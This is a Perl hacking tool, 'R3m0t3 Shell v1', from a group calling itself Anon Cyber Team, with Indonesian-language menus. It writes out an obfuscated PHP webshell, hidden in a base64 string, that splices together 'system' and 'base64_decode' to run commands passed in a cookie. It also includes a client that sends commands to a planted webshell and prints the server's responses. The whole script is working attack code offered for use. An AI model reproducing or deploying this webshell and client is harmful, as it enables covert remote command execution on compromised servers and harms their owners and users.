# R3m0t3 Shell v1
# Thx to: J.M. Fernández
# Team: Anon Cyber Team
# Contact: 4wsec@cyberservices.com


use LWP::UserAgent;
use Term::ANSIColor;
use MIME::Base64;


&rmtshell;

sub rmtshell {
	print color('bold red');
	print q(
   _   _   _   _   _   _     _   _   _   _   _  
  / \ / \ / \ / \ / \ / \   / \ / \ / \ / \ / \ 
 ( R | 3 | m | 0 | t | 3 ) ( S | h | e | l | l )
  \_/ \_/ \_/ \_/ \_/ \_/   \_/ \_/ \_/ \_/ \_/ 

);
print color('reset');
print colored ("--==[ Remote ur WebShell with this fucking tools XD",'bold green'); 
print " \n"; 
print colored ("--==[ By 4WSec - Anon Cyber Team",'bold green');
print " \n\n";
print q(
1. Membuat WebShell
2. Backconnect
3. Keluar

);

}

print color('bold yellow');
print "[*] Masukkan Pilihan: ";
$option = <STDIN>;
chomp($option);

if ($option eq "1") {
	&generate;
} elsif ($option eq "2") {
	&conn;
	exit;	
}

sub generate {
	$shell = "PD9waHAgJGEgPSAic3lzIjskYiA9ICJ0ZW0iOyRjID0gJGEuJGI7JHkgPSAiYmFzZSI7JHggPSAiNjQiOyR3ID0gIl8iOyR2ID0gImRlY28iOyR1ID0gImRlIjskeiA9ICR5LiR4LiR3LiR2LiR1OyRkID0gJHooQCRfQ09PS0lFWydEaXJ0eVBvcm4nXSk7QCRjKCRkKTs/Pg==";
	$shell = decode_base64($shell);
	print "\n\n[?] Insert a name for the file: ";
	$name = <STDIN>;
	chomp($name);
	open(FILE, ">>", $name);
	print FILE $shell;
	close(FILE);
	print "\n[!] File containing the webshell was created!\n\n";
	&rmtshell;
}


sub conn {
	print "\n[!] Masukkan URL tempat WebShell berada:  ";
	$url = <STDIN>;
	chomp($url);
	$ua = LWP::UserAgent->new;
	$response = $ua->get($url);
	if ($response->status_line !~ /200/) {
		print "[!] URL tidak terhubung. Mungkin salah atau webshell terhapus.\n";
		&rmtshell;
	} 
	print "\n[!] Terhubung! Ketik 'keluar' untuk memutuskan\n\n";
	while ($exe ne "exit") {
		print "[\$]> ";
		$exe = <STDIN>;
		print "\n";
		chomp($exe);
		if ($exe eq "keluar") { 
			print "[!] Memutuskan...\n\n";
			sleep(2);
			&rmtshell;
		} else {
			$response = $ua->get($url, Cookie => "DirtyPorn=". encode_base64($exe));
			$html = $response->decoded_content;
			print "\n$html\n";

		}

	}
}
